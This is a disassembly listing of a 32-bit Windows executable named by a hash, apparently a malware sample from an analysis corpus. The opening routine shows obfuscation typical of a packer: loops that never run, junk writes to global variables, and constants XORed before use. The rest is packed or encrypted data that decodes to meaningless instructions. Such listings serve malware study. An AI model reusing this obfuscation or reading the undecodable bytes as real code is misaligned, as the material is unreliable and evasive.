
3aaed92315923e6e1a7cb3813869ccdc62d5b1967b505685e53ec95e0d2a90b1.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xb4
  401009:	sub    DWORD PTR ds:0x428e87,ecx
  40100f:	mov    eax,DWORD PTR [ebp+0x8]
  401012:	push   ebx
  401013:	add    DWORD PTR ds:0x428e87,edi
  401019:	push   esi
  40101a:	push   edi
  40101b:	mov    DWORD PTR ds:0x428e9b,0x10
  401025:	cmp    DWORD PTR ds:0x428e9b,0x0
  40102c:	je     0x40107b
  401032:	cmp    DWORD PTR ds:0x428e9b,0x3
  401039:	jb     0x40107b
  40103f:	jmp    0x40104f
  401044:	push   0x428000
  401049:	call   DWORD PTR ds:0x42aa0b
  40104f:	cmp    DWORD PTR ds:0x428e9b,0x4
  401056:	jne    0x401069
  40105c:	mov    edi,DWORD PTR ds:0x428e9b
  401062:	dec    edi
  401063:	mov    DWORD PTR ds:0x428e9b,edi
  401069:	mov    edi,DWORD PTR ds:0x428e9b
  40106f:	dec    edi
  401070:	mov    DWORD PTR ds:0x428e9b,edi
  401076:	jmp    0x401025
  40107b:	mov    esi,0x75108af
  401080:	xor    eax,esi
  401082:	mov    DWORD PTR ds:0x428e87,0x16
  40108c:	cmp    DWORD PTR ds:0x428e87,0x0
  401093:	je     0x4010c8
  401099:	cmp    DWORD PTR ds:0x428e87,0x25
  4010a0:	jge    0x4010c8
  4010a6:	jmp    0x4010b6
  4010ab:	push   0x428189
  4010b0:	call   DWORD PTR ds:0x42aa0f
  4010b6:	mov    ecx,DWORD PTR ds:0x428e87
  4010bc:	dec    ecx
  4010bd:	mov    DWORD PTR ds:0x428e87,ecx
  4010c3:	jmp    0x40108c
  4010c8:	mov    edi,0x3272f6
  4010cd:	or     ecx,DWORD PTR ds:0x428ec7
  4010d3:	add    eax,edi
  4010d5:	mov    DWORD PTR [ebp-0x40],eax
  4010d8:	xor    eax,DWORD PTR ds:0x428e5f
  4010de:	mov    eax,ds:0x4281f3
  4010e3:	and    DWORD PTR ds:0x428ea7,0x31f0
  4010ed:	mov    eax,DWORD PTR [eax]
  4010ef:	sub    DWORD PTR ds:0x428e27,0x491
  4010f9:	mov    DWORD PTR [ebp-0x3c],eax
  4010fc:	mov    eax,ds:0x428403
  401101:	and    DWORD PTR ds:0x428e2f,ecx
  401107:	mov    eax,DWORD PTR [eax]
  401109:	mov    DWORD PTR [ebp-0x1c],eax
  40110c:	xor    DWORD PTR ds:0x428ec7,edx
  401112:	mov    DWORD PTR [ebp-0x34],0xf89c87a5
  401119:	and    DWORD PTR ds:0x428eb7,0x0
  401123:	jmp    0x401136
  401128:	xor    eax,eax
  40112a:	xor    eax,DWORD PTR ds:0x428eb7
  401130:	inc    eax
  401131:	mov    ds:0x428eb7,eax
  401136:	cmp    DWORD PTR ds:0x428eb7,0x14
  40113d:	jae    0x401165
  401143:	cmp    DWORD PTR ds:0x428eb7,0x1b
  40114a:	jl     0x401165
  401150:	jmp    0x401160
  401155:	push   0x83c7
  40115a:	call   DWORD PTR ds:0x42aa13
  401160:	jmp    0x401128
  401165:	mov    eax,DWORD PTR [ebp-0x34]
  401168:	and    ecx,DWORD PTR ds:0x428e2f
  40116e:	xor    eax,esi
  401170:	add    ecx,DWORD PTR ds:0x428ebf
  401176:	add    eax,edi
  401178:	sub    DWORD PTR ds:0x428e8f,0x1eb6
  401182:	mov    DWORD PTR [ebp-0x40],eax
  401185:	mov    eax,ds:0x428373
  40118a:	mov    DWORD PTR [ebp-0x40],eax
  40118d:	mov    DWORD PTR ds:0x428e97,0x16
  401197:	cmp    DWORD PTR ds:0x428e97,0x0
  40119e:	je     0x4011e9
  4011a4:	cmp    DWORD PTR ds:0x428e97,0x6
  4011ab:	jbe    0x4011e9
  4011b1:	jmp    0x4011c1
  4011b6:	push   0x4280f7
  4011bb:	call   DWORD PTR ds:0x42aa1b
  4011c1:	cmp    DWORD PTR ds:0x428e97,0x7
  4011c8:	jne    0x4011d9
  4011ce:	mov    eax,ds:0x428e97
  4011d3:	dec    eax
  4011d4:	mov    ds:0x428e97,eax
  4011d9:	mov    eax,ds:0x428e97
  4011de:	dec    eax
  4011df:	mov    ds:0x428e97,eax
  4011e4:	jmp    0x401197
  4011e9:	mov    eax,DWORD PTR [ebp-0x3c]
  4011ec:	sbb    DWORD PTR ds:0x428ea7,0x187d
  4011f6:	mov    DWORD PTR [ebp-0x14],eax
  4011f9:	not    eax
  4011fb:	mov    eax,DWORD PTR [ebp-0x14]
  4011fe:	push   0x4
  401200:	mov    DWORD PTR ds:0x428e83,0x1e
  40120a:	cmp    DWORD PTR ds:0x428e83,0x0
  401211:	je     0x401260
  401217:	cmp    DWORD PTR ds:0x428e83,0x7
  40121e:	jle    0x401260
  401224:	jmp    0x401234
  401229:	push   0x2582
  40122e:	call   DWORD PTR ds:0x42aa1f
  401234:	cmp    DWORD PTR ds:0x428e83,0x8
  40123b:	jne    0x40124e
  401241:	mov    ecx,DWORD PTR ds:0x428e83
  401247:	dec    ecx
  401248:	mov    DWORD PTR ds:0x428e83,ecx
  40124e:	mov    ecx,DWORD PTR ds:0x428e83
  401254:	dec    ecx
  401255:	mov    DWORD PTR ds:0x428e83,ecx
  40125b:	jmp    0x40120a
  401260:	pop    ecx
  401261:	sub    ecx,eax
  401263:	sub    eax,0x50fd
  401268:	add    ecx,DWORD PTR [ebp-0x1c]
  40126b:	mov    DWORD PTR [ebp-0x2c],0xf89c85e5
  401272:	mov    DWORD PTR ds:0x428e63,0x13
  40127c:	cmp    DWORD PTR ds:0x428e63,0x0
  401283:	je     0x4012b6
  401289:	cmp    DWORD PTR ds:0x428e63,0x16
  401290:	jb     0x4012b6
  401296:	jmp    0x4012a6
  40129b:	push   0x428000
  4012a0:	call   DWORD PTR ds:0x42aa23
  4012a6:	mov    eax,ds:0x428e63
  4012ab:	dec    eax
  4012ac:	mov    ds:0x428e63,eax
  4012b1:	jmp    0x40127c
  4012b6:	mov    DWORD PTR [ebp-0x18],ecx
  4012b9:	movzx  eax,WORD PTR ds:0x428e73
  4012c0:	sub    DWORD PTR ds:0x428e93,eax
  4012c6:	mov    DWORD PTR [ebp-0xa0],0xf89c85a1
  4012d0:	mov    eax,DWORD PTR [ebp-0x14]
  4012d3:	xor    DWORD PTR ds:0x428ec7,0x428e57
  4012dd:	mov    DWORD PTR [ebp-0x9c],eax
  4012e3:	mov    eax,DWORD PTR [ebp-0x18]
  4012e6:	mov    DWORD PTR [ebp-0x98],eax
  4012ec:	mov    eax,DWORD PTR [ebp-0x2c]
  4012ef:	adc    DWORD PTR ds:0x428ec7,0x7160
  4012f9:	xor    eax,esi
  4012fb:	sbb    DWORD PTR ds:0x428e3b,0x6908
  401305:	add    eax,edi
  401307:	or     DWORD PTR ds:0x428e2b,0x5a5f
  401311:	mov    DWORD PTR [ebp-0x94],eax
  401317:	not    DWORD PTR ds:0x428e47
  40131d:	lea    eax,[ebp-0x48]
  401320:	mov    DWORD PTR [ebp-0x90],eax
  401326:	adc    DWORD PTR ds:0x428ea7,edx
  40132c:	mov    eax,DWORD PTR [ebp-0xa0]
  401332:	or     DWORD PTR ds:0x428e57,0x428e77
  40133c:	xor    eax,esi
  40133e:	or     DWORD PTR ds:0x428e7f,0x24f1
  401348:	add    eax,edi
  40134a:	or     DWORD PTR ds:0x428e73,0x428e63
  401354:	mov    DWORD PTR [ebp-0xa0],eax
  40135a:	adc    DWORD PTR ds:0x428e63,0x428e67
  401364:	lea    eax,[ebp-0xa0]
  40136a:	push   eax
  40136b:	neg    eax
  40136d:	mov    eax,DWORD PTR [ebp+0xc]
  401370:	sub    DWORD PTR ds:0x428ecf,0x428e77
  40137a:	xor    eax,esi
  40137c:	xor    DWORD PTR ds:0x428ecf,0x428e67
  401386:	add    eax,edi
  401388:	sub    DWORD PTR ds:0x428e9f,0x428e77
  401392:	push   eax
  401393:	mov    eax,ds:0x428393
  401398:	add    DWORD PTR ds:0x428e73,0x428eb7
  4013a2:	push   0x4282e9
  4013a7:	or     DWORD PTR ds:0x428e47,0x49f0
  4013b1:	push   DWORD PTR [eax]
  4013b3:	or     DWORD PTR ds:0x428e47,0x428e5b
  4013bd:	call   0x4061d0
  4013c2:	sbb    edx,0x761a
  4013c8:	mov    ebx,DWORD PTR [ebp-0x14]
  4013cb:	adc    eax,edx
  4013cd:	mov    eax,DWORD PTR [ebp-0x18]
  4013d0:	mov    edx,DWORD PTR ds:0x428ec7
  4013d6:	adc    edx,DWORD PTR ds:0x428e37
  4013dc:	mov    DWORD PTR ds:0x428ec7,edx
  4013e2:	mov    DWORD PTR [ebp-0x58],eax
  4013e5:	movzx  eax,WORD PTR ds:0x428e5f
  4013ec:	and    DWORD PTR ds:0x428e23,eax
  4013f2:	mov    DWORD PTR [ebp-0x34],0xf89c853c
  4013f9:	mov    eax,0xf89c85a3
  4013fe:	mov    DWORD PTR [ebp-0x1c],eax
  401401:	sbb    DWORD PTR ds:0x428ec7,0x20b
  40140b:	lea    ecx,[eax+0x2]
  40140e:	sbb    DWORD PTR ds:0x428e87,ebx
  401414:	mov    DWORD PTR [ebp-0x28],ecx
  401417:	mov    DWORD PTR [ebp-0x10],0xf89c85a4
  40141e:	sbb    edx,0x4ac2
  401424:	mov    DWORD PTR [ebp-0x8],eax
  401427:	sbb    DWORD PTR ds:0x428ecb,edx
  40142d:	mov    eax,DWORD PTR [ebp-0x10]
  401430:	and    DWORD PTR ds:0x428eb7,0x0
  40143a:	mov    edx,DWORD PTR ds:0x428eb7
  401440:	inc    edx
  401441:	mov    DWORD PTR ds:0x428eb7,edx
  401447:	cmp    DWORD PTR ds:0x428eb7,0x21
  40144e:	jbe    0x401471
  401454:	jmp    0x401464
  401459:	push   0x73f7
  40145e:	call   DWORD PTR ds:0x42aa27
  401464:	cmp    DWORD PTR ds:0x428eb7,0x19
  40146b:	jb     0x40143a
  401471:	xor    eax,esi
  401473:	mov    edx,0xffcd8d8a
  401478:	add    DWORD PTR ds:0x428ec3,0x428e5b
  401482:	sub    edx,eax
  401484:	mov    DWORD PTR ds:0x428e43,0xef0
  40148e:	mov    DWORD PTR [ebp-0xc],edx
  401491:	not    eax
  401493:	mov    DWORD PTR [ebp-0x18],0xf89c85a0
  40149a:	mov    eax,DWORD PTR [ebp-0x8]
  40149d:	mov    DWORD PTR [ebp-0x3c],ebx
  4014a0:	mov    DWORD PTR ds:0x428e7f,0x7ee3
  4014aa:	cmp    eax,ecx
  4014ac:	mov    DWORD PTR ds:0x428ea7,0x6a4b
  4014b6:	je     0x403bac
  4014bc:	jmp    0x403815
  4014c1:	mov    ebp,0x855ffdc7
  4014c6:	inc    ebp
  4014c7:	popf   
  4014c8:	test   DWORD PTR [eax-0x6f58fa21],esi
  4014ce:	cmp    eax,0x83834e4b
  4014d3:	add    DWORD PTR [ebx-0x7c7c9fb9],0x2a
  4014da:	xor    DWORD PTR [eax],ebp
  4014dc:	ds cmp ah,BYTE PTR es:[eax+esi*1]
  4014e1:	jp     0x401520
  4014e3:	jbe    0x40155c
  4014e5:	test   eax,0x72737273
  4014ea:	dec    ebx
  4014eb:	(bad)  
  4014ed:	(bad)  
  4014ee:	ins    DWORD PTR es:[edi],dx
  4014ef:	push   ebp
  4014f0:	je     0x401570
  4014f2:	lods   eax,DWORD PTR fs:[esi]
  4014f4:	jge    0x401568
  4014f6:	data16 shl BYTE PTR [edx+0x53],1
  4014fa:	cmp    eax,0x87980391
  4014ff:	push   0x8d488052
  401504:	mov    bh,0x80
  401506:	mov    ebp,0x3144bb
  40150b:	ja     0x4014ee
  40150d:	add    ebp,DWORD PTR [eax+eax*4+0x1f]
  401511:	repnz inc esi
  401513:	rol    bl,cl
  401515:	repnz cwde 
  401517:	sub    al,0xdf
  401519:	xchg   esp,eax
  40151a:	adc    BYTE PTR ss:[esi-0x4c],ah
  40151e:	xchg   ebx,eax
  40151f:	(bad)  [eax]
  401521:	jb     0x401505
  401523:	sbb    ecx,ebp
  401525:	lsl    esi,WORD PTR [edi]
  401528:	and    eax,0x74371155
  40152d:	jne    0x4014f5
  40152f:	mov    al,0x2c
  401531:	pop    esi
  401532:	sbb    dh,BYTE PTR [edi+0x3456f600]
  401538:	mov    DWORD PTR [ebx-0x2b],ecx
  40153b:	fs push es
  40153d:	and    eax,DWORD PTR [ebx]
  40153f:	test   DWORD PTR [esi+0x60a5e27c],edi
  401545:	xchg   esp,eax
  401546:	mov    esi,0x4e9b2918
  40154b:	or     al,0x9f
  40154d:	inc    ecx
  40154e:	mov    ecx,DWORD PTR [esp+edx*1-0x6d94cd1d]
  401555:	dec    ecx
  401556:	dec    esp
  401557:	imul   edi,esp,0x963693d0
  40155d:	int    0xc8
  40155f:	rcl    DWORD PTR [ebp+0x6b5af96e],1
  401565:	push   ecx
  401566:	adc    DWORD PTR [edi],edi
  401568:	or     al,0x47
  40156a:	sbb    al,0xb2
  40156c:	push   esp
  40156d:	sar    DWORD PTR [eax+0x6719dd4d],cl
  401573:	add    ch,BYTE PTR [ebx+0x67]
  401576:	mov    edx,0x5c07506
  40157b:	pop    ebx
  40157c:	sub    BYTE PTR [ecx-0x23b44889],al
  401582:	or     ah,cl
  401584:	sbb    BYTE PTR [edi+ecx*2-0x30],ah
  401588:	sbb    ecx,ecx
  40158a:	je     0x401538
  40158c:	push   es
  40158d:	add    DWORD PTR [edx+0x4],ebp
  401590:	rol    BYTE PTR [ebp+0x19],cl
  401593:	mov    esi,DWORD PTR ds:0x6e4dd4dd
  401599:	add    BYTE PTR [ebp+0x2fb9932d],dh
  40159f:	(bad)  
  4015a0:	mov    esi,0xd397203f
  4015a5:	popa   
  4015a6:	cdq    
  4015a7:	fimul  WORD PTR [edx]
  4015a9:	xchg   edi,eax
  4015aa:	inc    esi
  4015ab:	sti    
  4015ac:	jo     0x401615
  4015ae:	add    eax,0x9e3417c2
  4015b3:	sub    DWORD PTR [esi],edi
  4015b5:	sub    ebp,DWORD PTR [ebx+0x6fc92972]
  4015bb:	push   ebx
  4015bc:	dec    edi
  4015bd:	ss pop ebp
  4015bf:	sub    BYTE PTR [ebx],bh
  4015c1:	sbb    al,0x60
  4015c3:	(bad)  
  4015c4:	(bad)  
  4015c5:	push   ds
  4015c6:	fiadd  DWORD PTR [ecx]
  4015c8:	stc    
  4015c9:	inc    esi
  4015ca:	pop    ebx
  4015cb:	cmp    edx,0x842971ff
  4015d1:	lods   al,BYTE PTR ds:[esi]
  4015d2:	rcr    BYTE PTR ds:0x552963af,cl
  4015d8:	sbb    BYTE PTR cs:[ecx],ah
  4015db:	mov    esp,0x8b506e28
  4015e0:	mov    cl,0xb8
  4015e2:	inc    ebx
  4015e3:	repz jns 0x40161b
  4015e6:	add    ebx,DWORD PTR [eax]
  4015e8:	mov    ah,0xbc
  4015ea:	jecxz  0x401591
  4015ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4015ed:	adc    ah,BYTE PTR [edx-0x1a41045e]
  4015f3:	pop    ebx
  4015f4:	add    dl,BYTE PTR [esi+edi*4-0x757167b]
  4015fb:	fcom   DWORD PTR [esi+0x4c]
  4015fe:	dec    esi
  4015ff:	outs   dx,BYTE PTR ss:[esi]
  401601:	add    edx,DWORD PTR [edx+ecx*4+0x41fed6c]
  401608:	jmp    0x5e95a8c1
  40160d:	mov    eax,0x3db69a8b
  401612:	in     eax,0x19
  401614:	ret    0x1872
  401617:	aam    0x20
  401619:	mov    ebx,0x9cc6b8e7
  40161e:	sbb    ch,cl
  401620:	push   ss
  401621:	cmp    eax,eax
  401623:	cmp    BYTE PTR [eax+edi*4+0x2],0xcf
  401628:	ins    BYTE PTR es:[edi],dx
  401629:	add    esi,ecx
  40162b:	xchg   edi,eax
  40162c:	push   ss
  40162d:	push   edx
  40162e:	(bad)  
  40162f:	imul   edi,eax,0xffffff81
  401632:	repnz int3 
  401634:	cmp    ebp,esp
  401636:	clc    
  401637:	xchg   BYTE PTR [edx+0xa07bfbc],al
  40163d:	sti    
  40163e:	daa    
  40163f:	hlt    
  401640:	dec    edx
  401641:	addr16 adc eax,0xcddaf1be
  401647:	and    edx,DWORD PTR [eax+ecx*8-0x78]
  40164b:	outs   dx,BYTE PTR ds:[esi]
  40164c:	cmp    DWORD PTR ds:0x3846a6e7,ebp
  401652:	pop    esp
  401653:	imul   ebx,DWORD PTR ds:[ebx],0x1
  401657:	jp     0x401675
  401659:	mov    edx,0xe072d5a1
  40165e:	mov    bh,0x99
  401660:	shl    al,1
  401662:	imul   esi,DWORD PTR [eax+0x16f1c657],0x52
  401669:	jbe    0x401669
  40166b:	inc    edi
  40166c:	shl    DWORD PTR [eax+esi*2+0x6],0x9f
  401671:	(bad)  
  401672:	fmul   DWORD PTR [edi-0x6b8def7c]
  401678:	mov    ds:0xb1188706,eax
  40167d:	inc    ebx
  40167e:	inc    eax
  40167f:	fild   QWORD PTR ds:0x8fa6c009
  401685:	mov    esp,0x8b256a39
  40168a:	loop   0x40169d
  40168c:	sbb    al,0x47
  40168e:	mov    ebx,0x8671a7c2
  401693:	cmp    DWORD PTR [ebp+0x6117f5a8],eax
  401699:	stos   DWORD PTR es:[edi],eax
  40169a:	mov    ebx,DWORD PTR [edi]
  40169c:	adc    bh,BYTE PTR [ecx-0x27b62529]
  4016a2:	scas   eax,DWORD PTR es:[edi]
  4016a3:	fs mov ebx,0xaf9216d0
  4016a9:	jmp    0x57eb3ed9
  4016ae:	popa   
  4016af:	outs   dx,DWORD PTR ds:[esi]
  4016b0:	adc    eax,0x5c003ef2
  4016b5:	dec    ebx
  4016b6:	jb     0x401646
  4016b8:	mov    bl,0x1
  4016ba:	push   ecx
  4016bb:	mov    eax,0x3aed6143
  4016c0:	sub    cl,cl
  4016c2:	nop
  4016c3:	(bad)  
  4016c4:	(bad)  
  4016c5:	loopne 0x4016e1
  4016c7:	adc    ecx,DWORD PTR [eax-0x4460ec25]
  4016cd:	call   0x9e11df2c
  4016d2:	out    dx,al
  4016d3:	mov    ds:0x6ded2e7f,eax
  4016d8:	out    dx,al
  4016d9:	cwde   
  4016da:	dec    eax
  4016db:	or     eax,0x118bc9d
  4016e0:	inc    esp
  4016e1:	cmp    DWORD PTR [ebx],esp
  4016e3:	rol    BYTE PTR [edx+0x4d83898d],1
  4016e9:	adc    eax,0xdefc5396
  4016ee:	mov    edi,0xd533a53a
  4016f3:	jl     0x4016a7
  4016f5:	mov    BYTE PTR [ebp+0x65],dh
  4016f8:	bswap  esi
  4016fa:	dec    ecx
  4016fb:	stos   BYTE PTR es:[edi],al
  4016fc:	cld    
  4016fd:	push   cs
  4016fe:	jbe    0x40169f
  401700:	dec    ebp
  401701:	jmp    0x29b8c266
  401706:	and    BYTE PTR [eax],0x69
  401709:	in     al,0x8a
  40170b:	cs sub al,bl
  40170e:	inc    edx
  40170f:	mov    al,ds:0xd4c73754
  401714:	(bad)  
  401715:	sub    BYTE PTR [ecx],dh
  401717:	sahf   
  401718:	sbb    cl,bh
  40171a:	mov    ebp,0x19db9001
  40171f:	lds    ebp,FWORD PTR [esi+0x4d86cf]
  401725:	xor    DWORD PTR [eax+0x6219f13f],esi
  40172b:	popf   
  40172c:	rcr    BYTE PTR [edi],cl
  40172e:	stos   BYTE PTR es:[edi],al
  40172f:	cmp    DWORD PTR [eax],0x3e
  401732:	mov    ah,0x24
  401734:	popa   
  401735:	ja     0x4016f3
  401737:	mov    BYTE PTR [edi+0x5d],ch
  40173a:	loop   0x4017ba
  40173c:	inc    ebx
  40173d:	ins    DWORD PTR es:[edi],dx
  40173e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40173f:	and    BYTE PTR [esi-0x337fad1a],dl
  401745:	(bad)  
  401746:	daa    
  401747:	rcl    DWORD PTR [eax+0x4d],cl
  40174a:	pop    ebx
  40174b:	cmp    ebp,edx
  40174d:	adc    eax,0xe30c2c16
  401752:	stos   BYTE PTR es:[edi],al
  401753:	in     eax,0xa8
  401755:	sub    eax,0x6f72d11c
  40175a:	mov    eax,ds:0x25575373
  40175f:	lea    esi,[edi]
  401761:	in     al,0x81
  401763:	add    bh,dl
  401765:	test   eax,0x5290b6c9
  40176a:	gs fs (bad) 
  40176d:	add    BYTE PTR [edx+ebx*1+0x78efc1d5],cl
  401774:	mov    es,ebx
  401776:	and    dl,BYTE PTR [edi-0x512f313d]
  40177c:	lds    ebx,FWORD PTR [ebx-0x7c6a8c5e]
  401782:	(bad)  
  401783:	repz faddp st(3),st
  401786:	ds pop ecx
  401788:	push   es
  401789:	push   esp
  40178a:	sti    
  40178b:	fcmove st,st(7)
  40178d:	int    0xda
  40178f:	dec    eax
  401790:	mov    DWORD PTR [ecx],edx
  401792:	cmp    BYTE PTR [edi-0x33113ecb],0x48
  401799:	stos   DWORD PTR es:[edi],eax
  40179a:	shl    DWORD PTR [esi],1
  40179c:	jecxz  0x401806
  40179e:	nop
  40179f:	fcomp  st(0)
  4017a1:	icebp  
  4017a2:	dec    edi
  4017a3:	dec    ecx
  4017a4:	xor    al,0x4d
  4017a6:	mov    bh,0x6a
  4017a8:	out    0xe6,eax
  4017aa:	pushf  
  4017ab:	das    
  4017ac:	iret   
  4017ad:	mov    al,ds:0xd15e9fa4
  4017b2:	dec    eax
  4017b3:	sub    bh,BYTE PTR [ebx-0x13]
  4017b6:	mov    dl,0x31
  4017b8:	push   es
  4017b9:	dec    ebp
  4017ba:	int3   
  4017bb:	adc    al,0xab
  4017bd:	mov    esp,0x80622c8f
  4017c2:	xchg   DWORD PTR [ebp-0x8],edi
  4017c5:	mov    ah,0x80
  4017c7:	shl    BYTE PTR [ebp+eiz*8+0x4055338f],1
  4017ce:	mov    bh,0x64
  4017d0:	out    0xaf,al
  4017d2:	repnz inc eax
  4017d4:	call   0x3bdf:0x62b0157
  4017db:	xchg   BYTE PTR [ebx-0x120f9239],dl
  4017e1:	cmc    
  4017e2:	cmp    edi,edi
  4017e4:	scas   eax,DWORD PTR es:[edi]
  4017e5:	xchg   ebx,eax
  4017e6:	loope  0x40184a
  4017e8:	ins    DWORD PTR es:[edi],dx
  4017e9:	xor    eax,0xbc0136c
  4017ee:	and    dl,BYTE PTR [ebx+0x5c]
  4017f1:	(bad)  
  4017f2:	fst    QWORD PTR [esi+0x1b]
  4017f5:	stos   DWORD PTR es:[edi],eax
  4017f6:	mov    bh,cl
  4017f8:	sbb    esi,edx
  4017fa:	or     eax,0xf9c2bb70
  4017ff:	je     0x4017e0
  401801:	ror    DWORD PTR [edi+0x504c7da6],0x23
  401808:	inc    ecx
  401809:	and    DWORD PTR [ecx],ebp
  40180b:	mov    ecx,0xe7c2fd26
  401810:	cdq    
  401811:	shl    esi,cl
  401813:	xchg   esi,eax
  401814:	push   ds
  401815:	mov    ebp,0x77ac2259
  40181a:	loope  0x4017f1
  40181c:	dec    esi
  40181d:	js     0x401859
  40181f:	push   ss
  401820:	ja     0x4017aa
  401822:	pop    ds
  401823:	jecxz  0x4017fa
  401825:	mov    bl,0x7a
  401827:	in     eax,0x19
  401829:	shl    BYTE PTR [esi+esi*4],0xf8
  40182d:	punpckldq mm4,DWORD PTR [eax]
  401830:	adc    BYTE PTR [ecx-0x79],0x85
  401834:	test   ch,dh
  401836:	push   0xbede60a2
  40183b:	div    DWORD PTR [bp+si]
  40183e:	push   eax
  40183f:	jecxz  0x4017ed
  401841:	dec    ebx
  401842:	neg    DWORD PTR [esi+0x521331a9]
  401848:	cmp    al,0x56
  40184a:	retf   
  40184b:	pushf  
  40184c:	or     ecx,edx
  40184e:	dec    ebp
  40184f:	xchg   esp,eax
  401850:	push   ebp
  401851:	sub    DWORD PTR [edx+0x3],edx
  401854:	pop    ds
  401855:	cmc    
  401856:	js     0x40180e
  401858:	adc    dh,bl
  40185a:	imul   BYTE PTR [esi+0x308c3e99]
  401860:	lahf   
  401861:	pop    es
  401862:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401863:	dec    eax
  401864:	int    0x68
  401866:	jo     0x401817
  401868:	call   0x61c6ed01
  40186d:	add    BYTE PTR [edx+0x58],0x2c
  401871:	out    0x47,al
  401873:	and    al,0x2d
  401875:	or     dl,BYTE PTR [ebp+0x66]
  401878:	pop    edx
  401879:	sbb    eax,DWORD PTR [ebp-0x2af422e6]
  40187f:	lods   al,BYTE PTR ds:[esi]
  401880:	pop    esi
  401881:	adc    DWORD PTR [esi+0x618472c6],eax
  401887:	sub    BYTE PTR [edx+0x2ae4fdda],dh
  40188d:	in     eax,0x2d
  40188f:	mov    WORD PTR [edx],gs
  401891:	mov    edx,0xd473d694
  401896:	push   ebp
  401897:	imul   ebx,DWORD PTR [ebx-0x75]
  40189b:	sbb    DWORD PTR [ebx-0x73],0x3
  40189f:	push   esi
  4018a0:	je     0x4018bf
  4018a2:	push   esp
  4018a3:	sub    al,0x2f
  4018a5:	mov    BYTE PTR [ecx+0x48],ch
  4018a8:	stos   BYTE PTR es:[edi],al
  4018a9:	dec    edi
  4018aa:	ins    BYTE PTR es:[edi],dx
  4018ab:	(bad)  
  4018ac:	out    0xb9,eax
  4018ae:	js     0x401839
  4018b0:	mov    ecx,0x6eae15e3
  4018b5:	pop    ecx
  4018b6:	jecxz  0x401856
  4018b8:	daa    
  4018b9:	out    dx,al
  4018ba:	sbb    bh,dh
  4018bc:	push   edx
  4018bd:	jne    0x4018f7
  4018bf:	in     eax,0x93
  4018c1:	nop
  4018c2:	clc    
  4018c3:	js     0x401896
  4018c5:	add    eax,0xd630dcce
  4018ca:	mov    ebx,0xdfa261d6
  4018cf:	shr    DWORD PTR cs:[esi+0x7e73c1f5],1
  4018d6:	inc    ebp
  4018d7:	rol    DWORD PTR [ebp+edx*4+0x78334944],0x10
  4018df:	jae    0x40193e
  4018e1:	mov    ds:0x6f0b1565,al
  4018e6:	inc    ecx
  4018e7:	add    al,0xa
  4018e9:	cmp    esp,edx
  4018eb:	lds    edx,FWORD PTR [ecx+0x4e2e6840]
  4018f1:	jg     0x4018f1
  4018f3:	mov    dh,0x6e
  4018f5:	arpl   si,bx
  4018f7:	fdiv   DWORD PTR [eax+0x3]
  4018fa:	cmp    DWORD PTR [ebx-0x4e],0xffffff9b
  4018fe:	clc    
  4018ff:	inc    esi
  401900:	mov    bl,0xb3
  401902:	or     DWORD PTR [edi-0x71465ebd],edi
  401908:	(bad)  
  40190a:	cmp    edi,DWORD PTR [edi]
  40190c:	pusha  
  40190d:	icebp  
  40190e:	popf   
  40190f:	jl     0x40191f
  401911:	mov    BYTE PTR [ebp-0x5288c913],0x5f
  401918:	out    0x6e,eax
  40191a:	push   edx
  40191b:	jp     0x401973
  40191d:	dec    ebp
  40191e:	in     eax,0x83
  401920:	fidivr DWORD PTR [ebp+0x7b6f377a]
  401926:	push   edx
  401927:	jp     0x401928
  401929:	stos   BYTE PTR es:[edi],al
  40192a:	jl     0x40194c
  40192c:	add    al,ch
  40192e:	jnp    0x401974
  401930:	xchg   edx,eax
  401931:	push   es
  401932:	mov    dh,0x57
  401934:	fs test al,ch
  401937:	cmc    
  401938:	sbb    edx,esi
  40193a:	imul   esi,DWORD PTR [ebp-0x50],0xffffffb6
  40193e:	mov    dh,0x13
  401940:	xchg   edi,eax
  401941:	sub    DWORD PTR [edi+ebx*4+0xa7ac435],0xa318ddc7
  40194c:	xor    bl,dh
  40194e:	js     0x40192f
  401950:	push   esp
  401951:	push   edi
  401952:	stos   BYTE PTR es:[edi],al
  401953:	add    BYTE PTR [ebp-0x12],dh
  401956:	add    BYTE PTR [edx],0xc7
  401959:	loope  0x40191e
  40195b:	mov    es,WORD PTR [eax+ebp*8]
  40195e:	ins    BYTE PTR es:[edi],dx
  40195f:	and    eax,0xf73b5750
  401964:	retf   
  401965:	out    dx,eax
  401966:	ins    DWORD PTR es:[edi],dx
  401967:	sar    ch,1
  401969:	xchg   ecx,eax
  40196a:	retf   
  40196b:	mov    ch,bl
  40196d:	or     edx,DWORD PTR [ebx]
  40196f:	inc    edi
  401970:	mov    edi,0x91013854
  401975:	sahf   
  401976:	rcl    DWORD PTR ds:0x9b7b372a,1
  40197c:	mov    ds:0xdf8585db,eax
  401981:	lds    esi,FWORD PTR [eax-0x62]
  401984:	dec    esp
  401985:	hlt    
  401986:	or     eax,0x2b7339d6
  40198b:	je     0x401935
  40198d:	out    dx,al
  40198e:	imul   esp,ebx,0xeab092dc
  401994:	jge    0x401929
  401996:	cmp    BYTE PTR [edi-0x4babfd85],dl
  40199c:	ja     0x40192c
  40199e:	enter  0xebea,0x1f
  4019a2:	cld    
  4019a3:	jl     0x40195d
  4019a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4019a6:	shl    BYTE PTR [esp+eax*1-0x79],cl
  4019aa:	dec    esp
  4019ab:	or     BYTE PTR [edi+0x58c6eabd],0x2b
  4019b2:	(bad)  
  4019b3:	popa   
  4019b4:	sub    dh,BYTE PTR [ebp+0x2a6b8652]
  4019ba:	shr    BYTE PTR [edx-0x4ad08099],0x73
  4019c1:	ds jno 0x401a39
  4019c4:	cmp    bl,BYTE PTR [edx+0x319d0b27]
  4019ca:	aas    
  4019cb:	mul    BYTE PTR [ecx+0xc]
  4019ce:	ss daa 
  4019d0:	mov    eax,ds:0x234cc983
  4019d5:	jbe    0x4019ae
  4019d7:	nop
  4019d8:	xchg   edx,eax
  4019d9:	and    dh,BYTE PTR [edx-0x7b]
  4019dc:	adc    DWORD PTR [ebx-0x19],esi
  4019df:	fisub  WORD PTR [edx+0x51]
  4019e2:	mov    ebp,0x768e278a
  4019e7:	leave  
  4019e8:	pop    ebp
  4019e9:	add    bh,bl
  4019eb:	jecxz  0x401a59
  4019ed:	mov    ebx,0x37e01dd7
  4019f2:	cmc    
